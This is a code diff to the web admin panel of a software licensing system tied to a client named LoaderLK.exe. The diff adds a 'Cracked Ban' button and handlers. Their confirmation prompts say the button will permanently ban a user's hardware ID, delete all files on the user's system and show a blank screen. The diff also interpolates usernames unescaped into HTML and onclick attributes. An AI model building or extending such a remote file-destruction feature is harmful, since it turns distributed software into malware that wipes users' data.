@@ -763,6 +763,7 @@
               <th>Days</th>
               <th>Created</th>
               <th>Last Login</th>
+              <th>Actions</th>
             </tr>
           </thead>
           <tbody id="users-table"></tbody>
@@ -1229,14 +1230,22 @@
       async function loadUsers() {
         const d = await api('GET', '/api/admin/users');
         if (!d.success) return;
-        document.getElementById('users-table').innerHTML = d.users.map(u => `<tr>
-      <td><strong>${u.username}</strong></td>
+        document.getElementById('users-table').innerHTML = d.users.map(u => {
+          const isCrackedBan = u.cracked_ban || false;
+          return `<tr>
+      <td><strong>${u.username}</strong>${isCrackedBan ? ' <span class="badge banned" style="font-size:10px">CRACKED</span>' : ''}</td>
       <td><span class="key-code">${u.key_code}</span></td>
       <td><span class="badge ${u.key_status || 'unknown'}">${u.key_status || '?'}</span></td>
       <td>${u.days || '-'}d</td>
       <td>${u.created_at ? new Date(u.created_at).toLocaleDateString() : '-'}</td>
       <td>${u.last_login ? new Date(u.last_login).toLocaleString() : '-'}</td>
-    </tr>`).join('');
+      <td>
+        ${!isCrackedBan ?
+              `<button class="btn sm red" onclick="crackedBan('${u.username}')" title="Cracked Ban (Permanent HWID ban + file destruction)"><i class="fas fa-skull-crossbones"></i> Cracked Ban</button>` :
+              `<button class="btn sm green" onclick="unbanCracked('${u.username}')" title="Remove cracked ban"><i class="fas fa-unlock"></i> Unban</button>`
+            }
+      </td>
+    </tr>`}).join('');
       }
 
       async function loadOnline() {
@@ -1249,6 +1258,34 @@
       <td>${u.session_start ? new Date(u.session_start).toLocaleString() : '-'}</td>
       <td>${u.last_heartbeat ? new Date(u.last_heartbeat).toLocaleString() : '-'}</td>
     </tr>`).join('');
+      }
+
+      // ===== CRACKED BAN SYSTEM =====
+      async function crackedBan(username) {
+        const reason = prompt(`Apply CRACKED BAN to ${username}?\n\nThis will:\n- Permanently ban HWID\n- Delete all files on user's system\n- Show blank white screen\n\nEnter reason:`);
+        if (!reason) return;
+
+        if (!confirm(`⚠️ WARNING ⚠️\n\nThis is PERMANENT and DESTRUCTIVE!\n\nUser: ${username}\nReason: ${reason}\n\nContinue?`)) return;
+
+        const res = await api('POST', '/api/admin/users/cracked-ban', { username, reason });
+        if (res.success) {
+          toast('✅ CRACKED BAN applied! User HWID permanently blocked.');
+          loadUsers();
+        } else {
+          toast('❌ ' + (res.message || 'Failed to apply cracked ban'));
+        }
+      }
+
+      async function unbanCracked(username) {
+        if (!confirm(`Remove CRACKED BAN from ${username}?\n\nUser will need to re-download LoaderLK.exe to login.`)) return;
+
+        const res = await api('POST', '/api/admin/users/unban-cracked', { username });
+        if (res.success) {
+          toast('✅ Cracked ban removed! User can login again.');
+          loadUsers();
+        } else {
+          toast('❌ ' + (res.message || 'Failed to remove cracked ban'));
+        }
       }
 
       // ===== HWID ADMIN =====
